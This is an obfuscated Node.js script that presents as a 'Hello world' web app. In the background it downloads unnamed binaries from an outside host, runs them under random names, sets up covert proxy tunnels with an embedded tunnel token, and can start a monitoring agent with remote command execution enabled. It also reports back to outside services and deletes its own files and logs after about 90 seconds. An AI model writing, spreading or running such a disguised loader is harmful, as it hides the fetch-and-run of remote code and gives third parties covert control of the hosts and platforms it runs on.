const _0x9f89d9=_0x37e5;(function(_0x233a59,_0x455967){const _0x3b3dfc=_0x37e5,_0x4fbb90=_0x233a59();while(!![]){try{const _0x1b4feb=-parseInt(_0x3b3dfc(0x11b))/0x1+parseInt(_0x3b3dfc(0x168))/0x2*(parseInt(_0x3b3dfc(0xcb))/0x3)+parseInt(_0x3b3dfc(0x122))/0x4*(parseInt(_0x3b3dfc(0x13f))/0x5)+parseInt(_0x3b3dfc(0x10a))/0x6+parseInt(_0x3b3dfc(0xdc))/0x7+parseInt(_0x3b3dfc(0xea))/0x8+-parseInt(_0x3b3dfc(0xe2))/0x9;if(_0x1b4feb===_0x455967)break;else _0x4fbb90['push'](_0x4fbb90['shift']());}catch(_0x2f83b9){_0x4fbb90['push'](_0x4fbb90['shift']());}}}(_0x1866,0xeabb5));function _0x1866(){const _0x2108d2=['config.yaml','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','firefox','1155cYEUGt','unlinkSync','\x20-c\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Download\x20','\x0a\x20\x20\x20\x20','readFileSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Hello\x20world!','sub.txt','existsSync','https://arm64.ssss.nyc.mn/v1','trojan','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20is\x20running','npm\x20running\x20error:\x20','axios','4243694guedyG','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ARGO_AUTH','.exe\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','tunnel.json','1601343bBpLIv','arm','statSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','stringify','split','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1972368SQXVVu','error','charAt','set','\x20>/dev/null\x202>&1','taskkill\x20/f\x20/im\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','stream','xzhang','tcp','php\x20running\x20error:\x20','quic','filter','log','/config.json\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','readdirSync','https://arm64.ssss.nyc.mn/web','Skipping\x20adding\x20automatic\x20access\x20task','includes','PORT','App\x20is\x20running','blackhole','Add\x20automatic\x20access\x20task\x20faild:\x20','8443','--tls','list.txt','/api/add-subscriptions','Nodes\x20uploaded\x20successfully','clear','\x0a\x20\x20\x0avmess://','1084152axRZGb','utf-8','Empowerment\x20success\x20for\x20','NAME','CFPORT','ArgoDomain:','then','443','SUB_PATH','amd','Error\x20downloading\x20files:','send','test','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','isFile','eyJhIjoiZTM4YjkwODZlYmJiZmMyYWUwNzBhZWVhYmNmNTE1ZWIiLCJ0IjoiZTM5NDZjZmItOWMxMC00ZTExLWIzZjMtMjljNDFmMmI3OTBhIiwicyI6Ik1HWmlPRGxpTWpBdE5tTXpPQzAwWXpKa0xXRXlOVGN0WWpRMU5tVXpOR00yTXpsayJ9','&path=%2Fvless-argo%3Fed%3D2560#','1425310QDhjii','\x0a\x20\x20tunnel:\x20','\x22\x20>\x20/dev/null\x202>&1','\x20is\x20created','http\x20server\x20is\x20running\x20on\x20port:','mkdirSync','2096','3021772DMgdNe','CFIP','ARGO_PORT','win32','ARGO_DOMAIN','basename','SERVER_PORT','&path=%2Ftrojan-argo%3Fed%3D2560#','tls','get','\x20already\x20exists','vless','Unhandled\x20error\x20in\x20startserver:','boot.log','FILE_PATH','unshift','from','response','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20-s\x20','https://amd64.ssss.nyc.mn/v1','\x20failed:\x20','listen','pop','NEZHA_KEY','close','/trojan-argo','post','2087','5dEMGyM','application/json','match','false','length','2083','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','util','\x20-c\x20\x22','message','\x20>/dev/null\x202>&1\x20&','data','has','&fp=firefox&type=ws&host=','child_process','trim','127.0.0.1','substring','floor','direct','automatic\x20access\x20task\x20added\x20successfully','\x20successfully','finish','Error\x20in\x20startserver:','/api/delete-nodes','pipe','/dev/null','push','unlink','abcdefghijklmnopqrstuvwxyz','base64','path','aarch64','none','writeFileSync','AUTO_ACCESS','https://amd64.ssss.nyc.mn/bot','PROJECT_URL','exec','cloud.xzhang.edu.kg','tunnel.yml','4030ezLanw','\x0avless://','forEach','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','platform','Empowerment\x20failed\x20for\x20','arch','xtls-rprx-vision','join','createWriteStream','text/plain;\x20charset=utf-8','nohup\x20','map','http','toString','block','/vmess-argo','config.json','./tmp','/sub.txt\x20saved\x20successfully','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/web','\x20-p\x20','catch','https://arm64.ssss.nyc.mn/bot','rm\x20-rf\x20','cdns.doon.eu.org','UPLOAD_URL','env','status','arm64','all','fileName','https://oooo.serv00.net/add-url','ARGO_DOMAIN:'];_0x1866=function(){return _0x2108d2;};return _0x1866();}const app=express(),axios=require(_0x9f89d9(0xdb)),os=require('os'),fs=require('fs'),path=require(_0x9f89d9(0x15e)),{promisify}=require(_0x9f89d9(0x146)),exec=promisify(require(_0x9f89d9(0x14d))[_0x9f89d9(0x165)]),{execSync}=require(_0x9f89d9(0x14d)),UPLOAD_URL=process[_0x9f89d9(0xc1)][_0x9f89d9(0xc0)]||'',PROJECT_URL=process[_0x9f89d9(0xc1)][_0x9f89d9(0x164)]||'',AUTO_ACCESS=process['env'][_0x9f89d9(0x162)]||![],FILE_PATH=process[_0x9f89d9(0xc1)][_0x9f89d9(0x130)]||_0x9f89d9(0x17a),SUB_PATH=process[_0x9f89d9(0xc1)][_0x9f89d9(0x112)]||_0x9f89d9(0xf2),PORT=process['env'][_0x9f89d9(0x128)]||process[_0x9f89d9(0xc1)][_0x9f89d9(0xff)]||0xbb8,UUID=process[_0x9f89d9(0xc1)]['UUID']||'a1e139ee-c959-4e2d-8e69-9f5dc14b06d8',NEZHA_SERVER=process[_0x9f89d9(0xc1)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x9f89d9(0x13a)]||'',ARGO_DOMAIN=process[_0x9f89d9(0xc1)][_0x9f89d9(0x126)]||_0x9f89d9(0x166),ARGO_AUTH=process[_0x9f89d9(0xc1)][_0x9f89d9(0xde)]||_0x9f89d9(0x119),ARGO_PORT=process[_0x9f89d9(0xc1)][_0x9f89d9(0x124)]||0x1f41,CFIP=process[_0x9f89d9(0xc1)][_0x9f89d9(0x123)]||_0x9f89d9(0xbf),CFPORT=process[_0x9f89d9(0xc1)][_0x9f89d9(0x10e)]||0x1bb,NAME=process[_0x9f89d9(0xc1)][_0x9f89d9(0x10d)]||'小张节点';!fs[_0x9f89d9(0xd5)](FILE_PATH)?(fs[_0x9f89d9(0x120)](FILE_PATH),console[_0x9f89d9(0xf7)](FILE_PATH+_0x9f89d9(0x11e))):console[_0x9f89d9(0xf7)](FILE_PATH+_0x9f89d9(0x12c));function generateRandomName(){const _0x36efb5=_0x9f89d9,_0x143bd8=_0x36efb5(0x15c);let _0x5a6102='';for(let _0x1ba989=0x0;_0x1ba989<0x6;_0x1ba989++){_0x5a6102+=_0x143bd8[_0x36efb5(0xec)](Math[_0x36efb5(0x151)](Math['random']()*_0x143bd8[_0x36efb5(0x143)]));}return _0x5a6102;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x9f89d9(0x170)](FILE_PATH,webName),botPath=path[_0x9f89d9(0x170)](FILE_PATH,botName),subPath=path[_0x9f89d9(0x170)](FILE_PATH,_0x9f89d9(0xd4)),listPath=path[_0x9f89d9(0x170)](FILE_PATH,_0x9f89d9(0x105)),bootLogPath=path[_0x9f89d9(0x170)](FILE_PATH,_0x9f89d9(0x12f)),configPath=path[_0x9f89d9(0x170)](FILE_PATH,_0x9f89d9(0x179));function deleteNodes(){const _0x219485=_0x9f89d9;try{if(!UPLOAD_URL)return;if(!fs[_0x219485(0xd5)](subPath))return;let _0x96927a;try{_0x96927a=fs['readFileSync'](subPath,_0x219485(0x10b));}catch{return null;}const _0x4dd309=Buffer[_0x219485(0x132)](_0x96927a,'base64')[_0x219485(0x176)](_0x219485(0x10b)),_0x9135e0=_0x4dd309['split']('\x0a')[_0x219485(0xf6)](_0x5419fe=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x219485(0x116)](_0x5419fe));if(_0x9135e0['length']===0x0)return;return axios[_0x219485(0x13d)](UPLOAD_URL+_0x219485(0x157),JSON['stringify']({'nodes':_0x9135e0}),{'headers':{'Content-Type':'application/json'}})[_0x219485(0xbc)](_0x24e94b=>{return null;}),null;}catch(_0x531a90){return null;}}function cleanupOldFiles(){const _0x3c7a9f=_0x9f89d9;try{const _0x450a87=fs[_0x3c7a9f(0xfb)](FILE_PATH);_0x450a87[_0x3c7a9f(0x16a)](_0x1fdf24=>{const _0xf77e3a=_0x3c7a9f,_0x144965=path[_0xf77e3a(0x170)](FILE_PATH,_0x1fdf24);try{const _0x246a97=fs[_0xf77e3a(0xe4)](_0x144965);_0x246a97[_0xf77e3a(0x118)]()&&fs[_0xf77e3a(0xcc)](_0x144965);}catch(_0x1e5de7){}});}catch(_0x2b0ef6){}}app[_0x9f89d9(0x12b)]('/',function(_0x249f18,_0x17541f){const _0x29b66f=_0x9f89d9;_0x17541f[_0x29b66f(0x115)](_0x29b66f(0xd3));});async function generateConfig(){const _0x2ae3f7=_0x9f89d9,_0x599d39={'log':{'access':'/dev/null','error':_0x2ae3f7(0x159),'loglevel':_0x2ae3f7(0x160)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2ae3f7(0x16f)}],'decryption':_0x2ae3f7(0x160),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2ae3f7(0x178),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2ae3f7(0xf3)}},{'port':0xbb9,'listen':_0x2ae3f7(0x14f),'protocol':_0x2ae3f7(0x12d),'settings':{'clients':[{'id':UUID}],'decryption':_0x2ae3f7(0x160)},'streamSettings':{'network':_0x2ae3f7(0xf3),'security':_0x2ae3f7(0x160)}},{'port':0xbba,'listen':_0x2ae3f7(0x14f),'protocol':_0x2ae3f7(0x12d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2ae3f7(0x160)},'streamSettings':{'network':'ws','security':_0x2ae3f7(0x160),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2ae3f7(0x175),_0x2ae3f7(0x12a),_0x2ae3f7(0xf5)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2ae3f7(0x14f),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2ae3f7(0x178)}},'sniffing':{'enabled':!![],'destOverride':[_0x2ae3f7(0x175),'tls',_0x2ae3f7(0xf5)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2ae3f7(0xd7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2ae3f7(0x160),'wsSettings':{'path':_0x2ae3f7(0x13c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2ae3f7(0x12a),_0x2ae3f7(0xf5)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x2ae3f7(0x152)},{'protocol':_0x2ae3f7(0x101),'tag':_0x2ae3f7(0x177)}]};fs[_0x2ae3f7(0x161)](path[_0x2ae3f7(0x170)](FILE_PATH,_0x2ae3f7(0x179)),JSON['stringify'](_0x599d39,null,0x2));}function getSystemArchitecture(){const _0x38def6=_0x9f89d9,_0x3d8b04=os[_0x38def6(0x16e)]();return _0x3d8b04===_0x38def6(0xe3)||_0x3d8b04===_0x38def6(0xc3)||_0x3d8b04===_0x38def6(0x15f)?'arm':_0x38def6(0x113);}function _0x37e5(_0x328595,_0x100239){const _0x1866aa=_0x1866();return _0x37e5=function(_0x37e525,_0x4a3d86){_0x37e525=_0x37e525-0xba;let _0x2ecbb3=_0x1866aa[_0x37e525];return _0x2ecbb3;},_0x37e5(_0x328595,_0x100239);}function downloadFile(_0x5034da,_0x253c11,_0x435eed){const _0x22368f=_0x9f89d9,_0x50a86f=_0x5034da;!fs[_0x22368f(0xd5)](FILE_PATH)&&fs[_0x22368f(0x120)](FILE_PATH,{'recursive':!![]});const _0x1b046e=fs[_0x22368f(0x171)](_0x50a86f);axios({'method':_0x22368f(0x12b),'url':_0x253c11,'responseType':_0x22368f(0xf1)})[_0x22368f(0x110)](_0x2f9018=>{const _0x465dcd=_0x22368f;_0x2f9018[_0x465dcd(0x14a)][_0x465dcd(0x158)](_0x1b046e),_0x1b046e['on'](_0x465dcd(0x155),()=>{const _0x276469=_0x465dcd;_0x1b046e[_0x276469(0x13b)](),console[_0x276469(0xf7)]('Download\x20'+path['basename'](_0x50a86f)+_0x276469(0x154)),_0x435eed(null,_0x50a86f);}),_0x1b046e['on'](_0x465dcd(0xeb),_0x51425a=>{const _0x23c31f=_0x465dcd;fs[_0x23c31f(0x15b)](_0x50a86f,()=>{});const _0x5b3542=_0x23c31f(0xcf)+path[_0x23c31f(0x127)](_0x50a86f)+_0x23c31f(0x137)+_0x51425a[_0x23c31f(0x148)];console[_0x23c31f(0xeb)](_0x5b3542),_0x435eed(_0x5b3542);});})[_0x22368f(0xbc)](_0x25435d=>{const _0x500e09=_0x22368f,_0x451c40=_0x500e09(0xcf)+path[_0x500e09(0x127)](_0x50a86f)+'\x20failed:\x20'+_0x25435d[_0x500e09(0x148)];console[_0x500e09(0xeb)](_0x451c40),_0x435eed(_0x451c40);});}async function downloadFilesAndRun(){const _0x485917=_0x9f89d9,_0x4bbeb5=getSystemArchitecture(),_0x6cd4b8=getFilesForArchitecture(_0x4bbeb5);if(_0x6cd4b8[_0x485917(0x143)]===0x0){console[_0x485917(0xf7)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x42e77c=_0x6cd4b8[_0x485917(0x174)](_0x5e61c3=>{return new Promise((_0x33149d,_0x338729)=>{const _0x243a04=_0x37e5;downloadFile(_0x5e61c3[_0x243a04(0xc5)],_0x5e61c3['fileUrl'],(_0x498b5f,_0x4cce0f)=>{_0x498b5f?_0x338729(_0x498b5f):_0x33149d(_0x4cce0f);});});});try{await Promise[_0x485917(0xc4)](_0x42e77c);}catch(_0x15c82e){console[_0x485917(0xeb)](_0x485917(0x114),_0x15c82e);return;}function _0x40d976(_0x40190e){const _0x500582=0x1fd;_0x40190e['forEach'](_0x1126af=>{const _0x303194=_0x37e5;fs[_0x303194(0xd5)](_0x1126af)&&fs['chmod'](_0x1126af,_0x500582,_0x38137e=>{const _0x28828e=_0x303194;_0x38137e?console['error'](_0x28828e(0x16d)+_0x1126af+':\x20'+_0x38137e):console['log'](_0x28828e(0x10c)+_0x1126af+':\x20'+_0x500582[_0x28828e(0x176)](0x8));});});}const _0xcd997=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x40d976(_0xcd997);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17cc13=NEZHA_SERVER[_0x485917(0xfe)](':')?NEZHA_SERVER[_0x485917(0xe7)](':')[_0x485917(0x139)]():'',_0x3d9fe4=new Set(['443',_0x485917(0x103),'2096',_0x485917(0x13e),_0x485917(0x144),'2053']),_0x5cceb6=_0x3d9fe4[_0x485917(0x14b)](_0x17cc13)?'true':_0x485917(0x142),_0x153e4c=_0x485917(0x17c)+NEZHA_KEY+_0x485917(0xe9)+NEZHA_SERVER+_0x485917(0xe8)+_0x5cceb6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x485917(0x161)](path[_0x485917(0x170)](FILE_PATH,_0x485917(0xc8)),_0x153e4c);const _0x367e55=_0x485917(0x173)+phpPath+_0x485917(0x147)+FILE_PATH+_0x485917(0x145);try{await exec(_0x367e55),console[_0x485917(0xf7)](phpName+'\x20is\x20running'),await new Promise(_0xc141c1=>setTimeout(_0xc141c1,0x3e8));}catch(_0x4413cd){console[_0x485917(0xeb)](_0x485917(0xf4)+_0x4413cd);}}else{let _0xd7075='';const _0x303cbb=[_0x485917(0x111),_0x485917(0x103),_0x485917(0x121),_0x485917(0x13e),_0x485917(0x144),'2053'];_0x303cbb[_0x485917(0xfe)](NEZHA_PORT)&&(_0xd7075=_0x485917(0x104));const _0xc70f6a='nohup\x20'+npmPath+_0x485917(0x135)+NEZHA_SERVER+':'+NEZHA_PORT+_0x485917(0xbb)+NEZHA_KEY+'\x20'+_0xd7075+_0x485917(0xd2);try{await exec(_0xc70f6a),console[_0x485917(0xf7)](npmName+_0x485917(0xd9)),await new Promise(_0x2cdc57=>setTimeout(_0x2cdc57,0x3e8));}catch(_0x3f3a61){console['error'](_0x485917(0xda)+_0x3f3a61);}}}else console[_0x485917(0xf7)](_0x485917(0xf0));const _0x3a7548=_0x485917(0x173)+webPath+_0x485917(0xcd)+FILE_PATH+_0x485917(0xf8);try{await exec(_0x3a7548),console['log'](webName+_0x485917(0xd9)),await new Promise(_0x4b15d4=>setTimeout(_0x4b15d4,0x3e8));}catch(_0x505421){console[_0x485917(0xeb)]('web\x20running\x20error:\x20'+_0x505421);}if(fs[_0x485917(0xd5)](botPath)){let _0x4e8a20;if(ARGO_AUTH[_0x485917(0x141)](/^[A-Z0-9a-z=]{120,250}$/))_0x4e8a20=_0x485917(0x16b)+ARGO_AUTH;else ARGO_AUTH[_0x485917(0x141)](/TunnelSecret/)?_0x4e8a20=_0x485917(0x117)+FILE_PATH+'/tunnel.yml\x20run':_0x4e8a20='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x485917(0xfa)+ARGO_PORT;try{await exec(_0x485917(0x173)+botPath+'\x20'+_0x4e8a20+_0x485917(0x149)),console[_0x485917(0xf7)](botName+_0x485917(0xd9)),await new Promise(_0x5cdced=>setTimeout(_0x5cdced,0x7d0));}catch(_0xe0e98b){console[_0x485917(0xeb)](_0x485917(0xe0)+_0xe0e98b);}}await new Promise(_0x3b6ff0=>setTimeout(_0x3b6ff0,0x1388));}function getFilesForArchitecture(_0x3b37be){const _0x192c88=_0x9f89d9;let _0x2a1c85;_0x3b37be===_0x192c88(0xe3)?_0x2a1c85=[{'fileName':webPath,'fileUrl':_0x192c88(0xfc)},{'fileName':botPath,'fileUrl':_0x192c88(0xbd)}]:_0x2a1c85=[{'fileName':webPath,'fileUrl':_0x192c88(0xba)},{'fileName':botPath,'fileUrl':_0x192c88(0x163)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x34608a=_0x3b37be==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x2a1c85[_0x192c88(0x131)]({'fileName':npmPath,'fileUrl':_0x34608a});}else{const _0x4eb0b4=_0x3b37be===_0x192c88(0xe3)?_0x192c88(0xd6):_0x192c88(0x136);_0x2a1c85[_0x192c88(0x131)]({'fileName':phpPath,'fileUrl':_0x4eb0b4});}}return _0x2a1c85;}function argoType(){const _0x16191e=_0x9f89d9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x16191e(0xf7)](_0x16191e(0xe5));return;}if(ARGO_AUTH[_0x16191e(0xfe)]('TunnelSecret')){fs[_0x16191e(0x161)](path['join'](FILE_PATH,_0x16191e(0xe1)),ARGO_AUTH);const _0x23a72c=_0x16191e(0x11c)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x16191e(0x134)+ARGO_DOMAIN+_0x16191e(0xc9)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x16191e(0x161)](path['join'](FILE_PATH,_0x16191e(0x167)),_0x23a72c);}else console[_0x16191e(0xf7)](_0x16191e(0xce));}argoType();async function extractDomains(){const _0x39fd8f=_0x9f89d9;let _0x39f3c7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39f3c7=ARGO_DOMAIN,console[_0x39fd8f(0xf7)](_0x39fd8f(0xc7),_0x39f3c7),await _0x4cc880(_0x39f3c7);else try{const _0x41de6e=fs[_0x39fd8f(0xd1)](path[_0x39fd8f(0x170)](FILE_PATH,'boot.log'),_0x39fd8f(0x10b)),_0x354398=_0x41de6e[_0x39fd8f(0xe7)]('\x0a'),_0x1a4522=[];_0x354398[_0x39fd8f(0x16a)](_0x24fdf2=>{const _0x4ebd60=_0x39fd8f,_0x2e317a=_0x24fdf2[_0x4ebd60(0x141)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e317a){const _0x3f426a=_0x2e317a[0x1];_0x1a4522[_0x4ebd60(0x15a)](_0x3f426a);}});if(_0x1a4522[_0x39fd8f(0x143)]>0x0)_0x39f3c7=_0x1a4522[0x0],console[_0x39fd8f(0xf7)](_0x39fd8f(0x10f),_0x39f3c7),await _0x4cc880(_0x39f3c7);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x39fd8f(0x170)](FILE_PATH,_0x39fd8f(0x12f)));async function _0x452374(){const _0x5112fb=_0x39fd8f;try{process[_0x5112fb(0x16c)]===_0x5112fb(0x125)?await exec(_0x5112fb(0xef)+botName+_0x5112fb(0xdf)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x5112fb(0x150)](0x1)+_0x5112fb(0x11d));}catch(_0x59ff24){}}_0x452374(),await new Promise(_0x4304ed=>setTimeout(_0x4304ed,0xbb8));const _0x2c444f=_0x39fd8f(0xf9)+FILE_PATH+_0x39fd8f(0xfa)+ARGO_PORT;try{await exec(_0x39fd8f(0x173)+botPath+'\x20'+_0x2c444f+_0x39fd8f(0x149)),console[_0x39fd8f(0xf7)](botName+_0x39fd8f(0xd9)),await new Promise(_0x1b1a70=>setTimeout(_0x1b1a70,0xbb8)),await extractDomains();}catch(_0x4ef430){console[_0x39fd8f(0xeb)](_0x39fd8f(0xe0)+_0x4ef430);}}}catch(_0xac6354){console[_0x39fd8f(0xeb)]('Error\x20reading\x20boot.log:',_0xac6354);}async function _0x4cc880(_0x2e0fe1){const _0x49c3dc=_0x39fd8f,_0x101c85=execSync(_0x49c3dc(0xdd),{'encoding':_0x49c3dc(0x10b)}),_0x73a751=_0x101c85[_0x49c3dc(0x14e)](),_0x33e057=NAME?NAME+'-'+_0x73a751:_0x73a751;return new Promise(_0x19b7fd=>{setTimeout(()=>{const _0x350bff=_0x37e5,_0x3e1fb4={'v':'2','ps':''+_0x33e057,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x350bff(0x160),'host':_0x2e0fe1,'path':'/vmess-argo?ed=2560','tls':_0x350bff(0x12a),'sni':_0x2e0fe1,'alpn':'','fp':_0x350bff(0xca)},_0x27d61d=_0x350bff(0x169)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2e0fe1+'&fp=firefox&type=ws&host='+_0x2e0fe1+_0x350bff(0x11a)+_0x33e057+_0x350bff(0x109)+Buffer[_0x350bff(0x132)](JSON['stringify'](_0x3e1fb4))[_0x350bff(0x176)](_0x350bff(0x15d))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2e0fe1+_0x350bff(0x14c)+_0x2e0fe1+_0x350bff(0x129)+_0x33e057+_0x350bff(0xd0);console[_0x350bff(0xf7)](Buffer[_0x350bff(0x132)](_0x27d61d)[_0x350bff(0x176)](_0x350bff(0x15d))),fs[_0x350bff(0x161)](subPath,Buffer[_0x350bff(0x132)](_0x27d61d)['toString'](_0x350bff(0x15d))),console['log'](FILE_PATH+_0x350bff(0x17b)),uploadNodes(),app[_0x350bff(0x12b)]('/'+SUB_PATH,(_0x51c49e,_0x2f4254)=>{const _0x17d25a=_0x350bff,_0x352fcd=Buffer['from'](_0x27d61d)[_0x17d25a(0x176)](_0x17d25a(0x15d));_0x2f4254[_0x17d25a(0xed)]('Content-Type',_0x17d25a(0x172)),_0x2f4254[_0x17d25a(0x115)](_0x352fcd);}),_0x19b7fd(_0x27d61d);},0x7d0);});}}async function uploadNodes(){const _0x4d0a2c=_0x9f89d9;if(UPLOAD_URL&&PROJECT_URL){const _0x2082ac=PROJECT_URL+'/'+SUB_PATH,_0x56fc32={'subscription':[_0x2082ac]};try{const _0x4614c7=await axios['post'](UPLOAD_URL+_0x4d0a2c(0x106),_0x56fc32,{'headers':{'Content-Type':_0x4d0a2c(0x140)}});return _0x4614c7&&_0x4614c7[_0x4d0a2c(0xc2)]===0xc8?(console[_0x4d0a2c(0xf7)]('Subscription\x20uploaded\x20successfully'),_0x4614c7):null;}catch(_0x211eb3){if(_0x211eb3[_0x4d0a2c(0x133)]){if(_0x211eb3[_0x4d0a2c(0x133)][_0x4d0a2c(0xc2)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5db82c=fs[_0x4d0a2c(0xd1)](listPath,'utf-8'),_0x505191=_0x5db82c['split']('\x0a')[_0x4d0a2c(0xf6)](_0x4f03d8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d0a2c(0x116)](_0x4f03d8));if(_0x505191[_0x4d0a2c(0x143)]===0x0)return;const _0x38e3ab=JSON[_0x4d0a2c(0xe6)]({'nodes':_0x505191});try{const _0x1d74c6=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x38e3ab,{'headers':{'Content-Type':'application/json'}});return _0x1d74c6&&_0x1d74c6[_0x4d0a2c(0xc2)]===0xc8?(console[_0x4d0a2c(0xf7)](_0x4d0a2c(0x107)),_0x1d74c6):null;}catch(_0x373a11){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x97d9bd=_0x37e5,_0x5a2d84=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5a2d84[_0x97d9bd(0x15a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5a2d84['push'](phpPath);process[_0x97d9bd(0x16c)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x5a2d84[_0x97d9bd(0x170)]('\x20')+'\x20>\x20nul\x202>&1',_0x1bca05=>{const _0xb5a5e4=_0x97d9bd;console[_0xb5a5e4(0x108)](),console[_0xb5a5e4(0xf7)](_0xb5a5e4(0x100)),console['log'](_0xb5a5e4(0xd8));}):exec(_0x97d9bd(0xbe)+_0x5a2d84[_0x97d9bd(0x170)]('\x20')+_0x97d9bd(0xee),_0x4d4c17=>{const _0x4ba294=_0x97d9bd;console[_0x4ba294(0x108)](),console[_0x4ba294(0xf7)]('App\x20is\x20running'),console[_0x4ba294(0xf7)](_0x4ba294(0xd8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x44ce56=_0x9f89d9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x44ce56(0xf7)](_0x44ce56(0xfd));return;}try{const _0x55c480=await axios[_0x44ce56(0x13d)](_0x44ce56(0xc6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x44ce56(0x140)}});return console[_0x44ce56(0xf7)](_0x44ce56(0x153)),_0x55c480;}catch(_0x51a55c){return console['error'](_0x44ce56(0x102)+_0x51a55c[_0x44ce56(0x148)]),null;}}async function startserver(){const _0x4942c3=_0x9f89d9;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5a50b2){console['error'](_0x4942c3(0x156),_0x5a50b2);}}startserver()[_0x9f89d9(0xbc)](_0x59c1e0=>{const _0x28f69b=_0x9f89d9;console['error'](_0x28f69b(0x12e),_0x59c1e0);}),app[_0x9f89d9(0x138)](PORT,()=>console[_0x9f89d9(0xf7)](_0x9f89d9(0x11f)+PORT+'!'));
